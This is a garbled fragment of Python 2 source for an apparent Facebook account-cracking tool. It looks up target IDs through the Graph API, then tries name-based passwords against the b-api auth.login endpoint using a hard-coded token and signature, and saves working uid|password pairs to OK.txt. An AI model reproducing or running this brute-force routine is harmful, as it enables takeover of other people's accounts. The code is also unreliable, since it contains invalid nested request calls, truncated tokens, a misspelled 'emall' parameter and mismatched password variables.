    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                pass2 = name.lower() + p2
                data = requests.get(q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    ...
                    pass3 = name.lower() + p3
                    data = requests.get(q = requests.get(q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        ...
                        pass4 = name.lower() + p4
                        data = requests.get(q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
...
def c_s():
    ...
    if a_s == '1':
        ...
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('http://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=2375ac27a739ed1a2263b1&format=json&sdk_version=2&emall=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=e8fa1fd1dd705c", headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/OK.txt', 'a')
                        ...
                        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=5257C0f140aabedfb65ac273b1&format=json&sdk_version=2&emall=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookie=d1dd705c", headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/OK.txt', 'a')
